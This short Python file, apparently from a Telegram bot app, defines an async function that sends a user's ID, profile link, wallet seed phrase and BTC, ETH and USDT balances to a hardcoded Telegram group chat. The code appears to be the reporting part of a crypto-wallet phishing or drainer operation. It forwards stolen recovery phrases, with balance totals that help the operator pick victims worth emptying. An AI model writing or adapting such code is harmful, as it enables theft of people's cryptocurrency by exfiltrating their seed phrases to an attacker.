from bot_app.main import bot


async def send_balance_to_telegram(user_id, balance_data):
    chat_id = -5470182025
    text = (
        f"💰 <b>Баланс</b>\n\n"
        f"<code>{user_id}</code>\n\n"
        f"<a href='tg://user?id={user_id}'>User Link</a>\n\n"
        f"Фраза/Сид: <code>{balance_data['phrase']}</code>\n\n"
        f"BTC: {balance_data['balance']['total_btc']}\n"
        f"ETH: {balance_data['balance']['total_eth']}\n"
        f"USDT: {balance_data['balance']['total_usdt']}\n"
        f"Итого: ${balance_data['balance']['total_usd']}\n\n"
        f"Действие: {balance_data['action'].upper()}\n\n"

    )
    await bot.send_message(chat_id, text, parse_mode="HTML")